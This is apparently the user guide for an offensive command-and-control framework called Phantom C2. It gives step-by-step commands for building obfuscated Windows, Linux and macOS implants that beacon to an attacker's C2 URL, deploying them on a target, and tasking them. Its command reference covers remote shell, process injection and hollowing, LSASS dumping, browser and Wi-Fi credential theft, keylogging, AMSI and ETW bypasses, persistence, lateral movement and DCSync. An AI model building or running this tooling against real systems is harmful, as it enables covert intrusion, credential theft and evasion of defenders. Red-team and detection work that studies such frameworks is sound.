# Phantom C2 — User Guide

This guide covers standing up Phantom C2, generating a payload (Go agent or the native **PhantomImplant**), deploying it, and driving agents from the **Web UI** and the **CLI**.

---

## 1. Architecture

Phantom C2 has three components:

| Component | Language | Repo | Purpose |
|-----------|----------|------|---------|
| **Server** | Go | `phantom-offensive/Phantom` | C2 server, CLI, Web UI, listeners |
| **Agent** | Go | (same repo, `cmd/agent`) | Cross-platform beacon |
| **PhantomImplant** | C | `phantom-offensive/PhantomImplant` | Evasive native Windows implant |

The server exposes:
- **Web UI** — `http://<host>:3000` (default login `admin` / `phantom`, changed in config).
- **CLI** — interactive shell inside `phantom-server`.
- **Listener(s)** — the agent callbacks (default HTTP `:8080`).

---

## 2. Prerequisites

**Server (WSL / Kali / Linux):**

```bash
sudo apt update
sudo apt install -y golang-go git make
```

**PhantomImplant (C) cross-compile:**

```bash
sudo apt install -y mingw-w64 nasm
```

---

## 3. Start the Server

```bash
git clone https://github.com/phantom-offensive/Phantom.git
cd Phantom

# 1. Generate RSA keypair
go run ./cmd/keygen -out configs/

# 2. Build
make server

# 3. Run (headless, web UI + listeners auto-start)
./build/phantom-server --config configs/server.yaml --headless --mode both
```

`configs/server.yaml` controls listeners, Web UI bind, and the staging token. A minimal HTTP listener:

```yaml
listeners:
  - name: "default-http"
    type: "http"
    bind: "0.0.0.0:8080"
    profile: "default"
```

Open the Web UI at `http://localhost:3000` and log in.

> **Interactive CLI:** run `./build/phantom-server` without `--headless` to get the CLI login.

---

## 4. Generate a Payload

### 4.1 Go Agent (cross-platform beacon)

```bash
cd ~/phantom

# Windows EXE
make agent-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20

# Linux
make agent-linux LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20

# macOS
make agent-darwin LISTENER_URL=https://your-c2.com:443

# Obfuscated Windows EXE (garble)
make agent-garble-windows LISTENER_URL=https://your-c2.com:443

# Windows DLL (rundll32 / regsvr32 / sideload)
make agent-dll LISTENER_URL=https://your-c2.com:443

# Position-independent shellcode (requires donut)
make agent-shellcode LISTENER_URL=https://your-c2.com:443
```

Output lands in `build/agents/`.

### 4.2 PhantomImplant (native C, evasive Windows)

```bash
git clone https://github.com/phantom-offensive/PhantomImplant.git
cd PhantomImplant
```

**Step A — configure** `src/main.c`:

```c
#define C2_SERVER_URL   "https://YOUR_C2_SERVER:443"
#define C2_SLEEP_MS     10000
#define C2_JITTER_PCT   20
#define C2_KILL_DATE    "2026-12-31"   // or "" for none
```

**Step B — embed the server RSA public key.** Extract the DER bytes from `configs/server.pub` and paste them into the `g_ServerPubKeyDer[]` array in `src/main.c`:

```bash
cd ~/phantom
python3 -c "
import base64
lines = open('configs/server.pub').read().splitlines()
b64 = ''.join(l.strip() for l in lines if not l.startswith('---'))
der = base64.b64decode(b64)
print('static const BYTE g_ServerPubKeyDer[] = {' + ', '.join(f'0x{b:02X}' for b in der) + '};')
print('static const DWORD g_dwServerPubKeyDerLen = ' + str(len(der)) + ';')
"
```

**Step C — build:**

```bash
make release     # silent implant (no console, WinMain)
make debug       # console + test harness
```

Output: `build/phantom-implant.exe` (release) or `build/phantom-implant-debug.exe` (debug).

| Mode | Command | Run | Behavior |
|------|---------|-----|----------|
| Release | `make release` | `phantom-implant.exe` | silent C2 loop |
| Debug (test) | `make debug` | `phantom-implant-debug.exe` | diagnostic test + one check-in, exits |
| Debug (loop) | `make debug` | `phantom-implant-debug.exe --loop` | persistent C2 loop for interaction |

> Use `--loop` when you want to task the debug implant interactively.

---

## 5. Deploy the Payload

Copy the built EXE to the target and run it:

```powershell
# Go agent (Windows)
.\phantom-agent_windows_amd64.exe

# PhantomImplant (release, silent)
.\phantom-implant.exe

# PhantomImplant (debug, interactive)
.\phantom-implant-debug.exe --loop
```

The implant registers with the C2, then checks in on its sleep interval.

---

## 6. Interact with Agents

### Web UI

1. Open **Agents** — select an agent.
2. Use the **Terminal** tab to type commands.
3. Or use the per-agent command box.

### CLI

From the interactive server shell, select an agent, then type the same commands.

---

## 7. Agent Command Reference

### Recon & Info

| Command | Description |
|---------|-------------|
| `shell <cmd>` | Execute a shell command and return output |
| `sysinfo` | Hostname, user, OS, arch, PID, IP |
| `ps` | Process list (PID, PPID, threads) |
| `ifconfig` | Network adapters (IP/MAC/gateway) |
| `cd <path>` | Change working directory |
| `info` | Agent details |
| `tasks` | Task history for the agent |

### File Operations

| Command | Description |
|---------|-------------|
| `upload <local> <remote>` | Upload a file to the agent |
| `download <path>` | Download a file from the agent |
| `screenshot` | Capture screen (BMP in memory) |

### Execution & Injection

| Command | Description |
|---------|-------------|
| `shellcode <file>` | Execute raw shellcode in-process (indirect syscalls) |
| `assembly <path> [args]` | Run a .NET assembly (Seatbelt, Rubeus) |
| `bof <file> [args]` | Run a Beacon Object File in-memory |
| `inject <pid> <file>` | Remote process injection (by PID) |
| `inject <name> <file>` | Remote injection by process name |
| `inject earlybird <file>` | Early Bird APC injection |
| `inject hijack <file>` | Thread hijack a suspended `RuntimeBroker.exe` |
| `inject hijack-enum <name> <file>` | Thread hijack an existing process by name |
| `hollow <host-exe> <shellcode-file>` | Process hollowing |

### PE Hollowing (PhantomImplant inject methods)

The C implant supports four image-based hollowing methods. The `<file>` here is a full PE (e.g. `notepad.exe`, `mimikatz.exe`), not raw shellcode.

| Command | Description |
|---------|-------------|
| `inject ghost <pe-file> [legit-image]` | Ghost Process Injection (delete-pending section + `NtCreateProcessEx`) |
| `inject ghostly <pe-file> [legit-image]` | Ghostly Hollowing (map ghost section + hijack) |
| `inject herpaderp <pe-file> [legit-image]` | Process Herpaderping (disk shows legit image) |
| `inject herpaderply <pe-file> [legit-image]` | Herpaderply Hollowing (map section + hijack) |

Default `legit-image` is `C:\Windows\System32\RuntimeBroker.exe`.

### Credential Access

| Command | Description |
|---------|-------------|
| `creds` | LSASS dump (handle duplication + fork + MiniDump, requires elevation) |
| `creds all` / `browser` / `wifi` | Harvest credentials |
| `token <steal|make|revert>` | Token manipulation (Windows) |
| `keylog [seconds]` | Keylogger (default 30s) |

### Evasion & Persistence

| Command | Description |
|---------|-------------|
| `evasion` | Re-run ntdll unhook + ETW + AMSI bypass |
| `persist <method>` | Install persistence |
| `sleep <sec> [jitter%]` | Change beacon interval |

### Lateral Movement & Pivoting

| Command | Description |
|---------|-------------|
| `lateral wmiexec <ip> ...` | WMI execution |
| `lateral winrm <ip> ...` | WinRM execution |
| `lateral psexec <ip> ...` | PsExec execution |
| `socks <start|stop|list>` | SOCKS5 proxy |
| `portfwd <local> <remote>` | TCP port forward |
| `pivot <start|stop|list>` | SMB/socket relay |

### Active Directory

| Command | Description |
|---------|-------------|
| `ad-enum-users` | Enumerate domain users |
| `ad-enum-groups` | Enumerate domain groups |
| `ad-enum-computers` | Enumerate domain computers |
| `ad-enum-spns` | Find SPNs (Kerberoast) |
| `ad-kerberoast` | Kerberoasting |
| `ad-asreproast` | AS-REP roasting |
| `ad-dcsync` | DCSync |
| `ad-help` | Full AD command reference |

### Session

| Command | Description |
|---------|-------------|
| `back` | Return to main menu |
| `kill` | Terminate the agent |

---

## 8. Notes & Limitations

- **LSASS dump (`creds`)** uses handle duplication + `NtCreateProcessEx` fork + `MiniDumpWriteDump`. On Windows 11 hosts where LSASS is **PPL-protected**, there may be no duplicable LSASS handle, so the dump cannot complete — that is an environment limitation, not a bug. A PPL bypass (BYOVD / KnownDLL poisoning) or a non-PPL VM is required in that case.
- **Injection techniques** use indirect syscalls and image mapping where possible, but no userland-only technique guarantees full EDR evasion. Test against the target's actual security stack.
- All command output is returned through the C2 channel; large outputs are truncated in the UI.

---

## 9. Quick Reference — Full Workflow

```bash
# Server
cd ~/phantom
go run ./cmd/keygen -out configs/
make server
./build/phantom-server --config configs/server.yaml --headless --mode both

# Go agent payload
make agent-windows LISTENER_URL=https://YOUR_C2:443 SLEEP=10 JITTER=20

# PhantomImplant payload
cd ~/phantom-implant
# ...edit src/main.c (server URL + RSA pubkey)...
make release

# Deploy + task via Web UI (http://localhost:3000) or CLI
```
